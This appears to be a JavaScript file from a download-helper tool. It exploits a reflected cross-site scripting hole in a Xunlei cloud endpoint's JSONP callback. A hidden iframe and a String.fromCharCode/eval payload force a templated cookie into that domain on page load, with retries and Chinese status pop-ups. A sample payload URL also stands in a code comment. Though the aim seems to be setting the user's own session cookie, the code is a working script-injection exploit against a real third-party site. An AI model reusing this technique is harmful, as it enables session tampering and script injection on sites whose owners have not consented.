var xss_retry = 20;
var stoped = false;
function xss() {
  if (document.cookie.indexOf("xss=done") != -1) {
    $.fancybox.close();
    return;
  }
  if (xss_retry <= 0 || stoped) {
    $.fancybox('<div style="width:300px;"><p style="color: red;">Cookie写入失败...</p><p>您可能无法使用浏览器下载功能</p><p><a href="javascript:location.reload();">刷新重试</a>，或向作者回报这个问题：<a href="http://gplus.to/binux">+足兆叉虫</a></p></div>', {padding: 20, onClosed: function () { document.cookie = "xss=done;"; }});
    return;
  }
  // http://dynamic.cloud.vip.xunlei.com/interface/task_process?callback=%3Cscript%20src=task_process%26callback=function%2520a%28%29%257Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C34%2C115%2C101%2C116%2C32%2C99%2C111%2C111%2C107%2C105%2C101%2C33%2C34%2C41%29%29%3B%257D%2520a%3E%3C/script%3E
  var script = 'document.cookie="{{ cookie }}";document.write("<iframe src=\\\"{{ request.protocol }}://{{ request.host }}/xss\\\" />");';
  var code = [];
  for (var i=0;i<script.length;i++) {
    code.push(script.charCodeAt(i));
  }
  var script_code = escape(code.join(","));
  var iframe = document.createElement("iframe");
  iframe.setAttribute("style", "display: none;");
  iframe.src = "http://dynamic.cloud.vip.xunlei.com/interface/task_process?callback=%3Cscript%20src=task_process%26callback=function%2520a%28%29%257Beval%28String.fromCharCode%28"+script_code+"%29%29%3B%257D%2520a%3E%3C/script%3E";
  iframe.addEventListener("load", function(){
    this.removeEventListener("load", arguments.call, false);
    xss();
  }, false);
  document.body.appendChild(iframe);
  xss_retry -= 1;
}
jQuery(document).ready(function() {
  if (document.cookie.indexOf("xss=done") == -1) {
    $.fancybox('<div style="width:300px">正在尝试写入cookie，请稍候...</div>', {padding: 20});
    xss();
    setTimeout(function() { stoped = true; xss(); }, 30000);
  }
});
